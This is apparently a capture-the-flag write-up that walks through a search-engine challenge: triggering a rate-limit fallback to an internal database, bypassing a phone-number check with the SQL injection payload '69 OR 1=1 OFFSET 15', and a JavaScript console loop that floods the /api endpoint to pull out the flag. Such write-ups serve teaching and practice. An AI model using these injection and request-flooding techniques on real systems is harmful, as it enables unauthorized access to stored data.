Note: concurrent connections are limited to 5 per IP and repsonses are delayed by 500 ms to avoid brute forcing

1. Notice that there is a rate limit in place for the "expensive API", and a fallback to the "internal database" (your third request in two seconds will fall back to "internal database")
2. Find an SQL injection payload which bypasses the "not a valid phone number" check (anything which starts with `69`, `420` or `1337` and does not include `-`, `;` and `/*`)
3. Notice that you only get 1 result. You can read in the /about page that there's a `LIMIT 1` statement in our query to optimise performance
4. Iterate over results and find that `LIMIT 15` contains a number that ends with 025
5. Working payload: `69 OR 1=1 OFFSET 15`

Executing this script in your console (while on the search-engine page) should output the flag:

```javascript
(async function spamRequests(n) {
    for (let i = 0; i < n; i++) {
        resp = fetch('/api', {
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'text/plain'
            },
            body: '1337 OR 1=1 OFFSET 15',
        })
        .then(async function(resp) { 
            if (resp.status === 200) {
                const data = await resp.json()
                console.log(data.data[0]);
            }
        });
    }
})(5);
```